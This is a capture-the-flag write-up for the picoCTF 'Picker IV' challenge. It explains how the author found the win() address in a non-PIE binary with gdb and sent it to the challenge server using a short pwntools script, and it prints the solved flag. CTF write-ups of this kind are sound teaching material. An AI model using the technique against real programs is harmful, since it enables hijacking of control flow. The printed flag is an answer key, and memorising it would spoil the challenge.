# Picker IV
> Write-up author: jon-brandy
## DESCRIPTION:
Can you figure out how this program works to get the flag? 
Connect to the program with netcat: [YOUR NETCAT] The program's source code can be downloaded here. The binary can be downloaded here.
## HINT:
- With Python, there are no binaries. With compiled languages like C, there is source code, and there are binaries. Binaries are created from source code, they are a conversion from the human-readable source code, to the highly efficient machine language, in this case: x86_64.
- How can you find the address that win is at?

## STEPS:
1. In this challenge we're given a binary and the source code.
2. Let's check the binary protections:

> 64 bit binary, No Canary, PIE Disabled

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/ef9593ae-10ed-4222-bda0-54b51f48cc97)


3. Since we're given the source code, hence no need to decompile the binary, let's analyze the source code.

> Main function

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/c60dad98-13b8-4202-b504-c132b592ccf3)


4. This is getting interesting now, there's no BOF vulnerability and it seems we can access the win() function by input the address manually.
5. Actually there's many way to get the win() address, for this solution i used gdb to grab it because there's no PIE.

> USING GDB - GOT --> 0x40129e

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/67d89c53-3a7c-4076-9e56-55988cd3f1da)


6. Let's automate it:

```py
from pwn import * 

sh = remote('saturn.picoctf.net',64146)

win_addr = b'40129e' # excluding 0x because they want it so
sh.sendlineafter(b':', win_addr)
get = sh.recvall()
info(get)
```

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/c2263fc4-4fcb-4389-b2d0-6846f4a97e13)

7. Got the flag!

## FLAG

```
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
```
